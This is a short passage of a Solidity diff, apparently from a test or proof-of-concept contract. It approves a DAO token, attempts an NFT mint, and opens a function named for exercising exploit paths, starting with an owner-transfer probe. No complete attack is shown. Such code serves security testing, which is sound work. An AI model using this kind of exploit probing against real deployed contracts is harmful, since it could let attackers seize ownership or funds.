+        if (!DAO_TOKEN.approve(TARGET, ONE_DAO)) {
+            return false;
+        }
+        try NFT.mint(1) {
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    function _exerciseExploitPaths(uint256 tokenId) internal returns (bool) {
+        // Owner-transfer path probe:
